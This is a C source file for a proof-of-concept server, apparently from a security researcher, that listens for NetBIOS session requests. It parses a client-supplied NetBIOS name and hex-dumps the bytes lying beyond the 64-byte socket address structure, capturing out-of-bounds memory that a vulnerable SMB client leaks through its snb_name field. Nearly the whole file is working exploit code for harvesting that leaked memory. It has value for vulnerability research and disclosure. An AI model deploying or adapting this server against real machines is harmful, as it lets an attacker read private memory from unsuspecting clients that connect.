//
//  main.c
//  poc_snb_name_oob_read_server
//
//  Created by sreejith on 3/16/22.
//

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#include <sys/socket.h>
#include <sys/errno.h>
#include <arpa/inet.h>

#include <smbfs/netbios.h>

#include "config.h"


#define MAX_REQUEST_SIZE 16384


void hex_dump(const char* data, size_t data_size) {
    for (size_t i=0; i<data_size; i++) {
        printf("%.2x ", (uint8_t)data[i]);
        if ((i+1) % 8 == 0) {
            printf("\n");
        }
    }
    if (data_size % 8 != 0) {
        printf("\n");
    }
}


size_t find_nb_name_length(char* data, size_t data_len) {
    /// Find the total size of NetBIOS name in compressed encoding format
    size_t cursor = 0;
    while (1) {
        if (cursor >= data_len) {
            return 0;
        }
        
        uint8_t label_len = data[cursor];
        if (label_len == 0) {
            break;
        } else {
            cursor += label_len + 1;
        }
    }
    return cursor;
}


int main(int argc, const char * argv[]) {
    struct sockaddr_in saddr;
    bzero(&saddr, sizeof(saddr));
    
    saddr.sin_len = sizeof(saddr);
    saddr.sin_family = AF_INET;
    saddr.sin_port = htons(SMB_SOCKET_PORT);
    inet_aton(SMB_SOCKET_HOST, &saddr.sin_addr);
    
    int socket_fd = socket(PF_INET, SOCK_STREAM, 0);
    if (socket_fd < 0) {
        printf("[ERROR] failed to open socket, err: %s\n", strerror(errno));
        exit(1);
    }
    
    int res = bind(socket_fd, (const struct sockaddr*)&saddr, sizeof(saddr));
    if (res) {
        printf("[ERROR] failed to bind socket to %s:%d, err: %s\n", SMB_SOCKET_HOST, SMB_SOCKET_PORT, strerror(errno));
        exit(1);
    }
    
    res = listen(socket_fd, 16);
    if (res) {
        printf("[ERROR] failed to listen on %s:%d, err: %s\n", SMB_SOCKET_HOST, SMB_SOCKET_PORT, strerror(errno));
        exit(1);
    }
    
    printf("[INFO] server started listening on %s:%d\n", SMB_SOCKET_HOST, SMB_SOCKET_PORT);
    
    while (1) {
        printf("[INFO] waiting for new connection\n");
        
        int client_fd = accept(socket_fd, NULL, NULL);
        if (client_fd < 0) {
            printf("[ERROR] failed to accept new connection, err: %s\n", strerror(errno));
            exit(1);
        }
        
        printf("[INFO] received new connection\n");
        
        uint32_t header;
        ssize_t received = recv(client_fd, &header, sizeof(header), MSG_WAITALL);
        if (received != sizeof(header)) {
            printf("[WARN] failed to read request header, err: %s\n", strerror(errno));
            close(client_fd);
            continue;
        }
        
        header = htonl(header);
        uint32_t request_length = header & 0xffffff;
        uint32_t request_cmd = header >> 24;
        
        if (request_cmd != NB_SSN_REQUEST) {
            printf("[WARN] received unknown command 0x%x\n", request_cmd);
            close(client_fd);
            continue;
        }
        
        if (request_length > MAX_REQUEST_SIZE) {
            printf("[WARN] request size %d too big\n", request_length);
            close(client_fd);
            continue;
        }
        
        char* data = malloc(request_length);
        received = recv(client_fd, data, request_length, MSG_WAITALL);
        if (received != request_length) {
            printf("[WARN] failed to read request header, err: %s\n", strerror(errno));
            free(data);
            close(client_fd);
            continue;
        }
        
        /// Find the length of server netbios name
        size_t server_nb_name_len = find_nb_name_length(data, request_length);
        if (!server_nb_name_len) {
            printf("[WARN] received invalid netbios name\n");
            free(data);
            close(client_fd);
            continue;
        }
        
        /// Skip the part of server netbios name which is inside the memory allocated for socket address
        size_t oob_data_offset = 64 - offsetof(struct sockaddr_nb, snb_name);
        char* oob_data_start = data + oob_data_offset;
        size_t oob_data_len = server_nb_name_len - oob_data_offset;
        
        printf("[INFO] received OOB read data of len %lu: \n", oob_data_len);
        hex_dump(oob_data_start, oob_data_len);
        printf("\n");
        
        free(data);
        close(client_fd);
    }
    
    return 0;
}
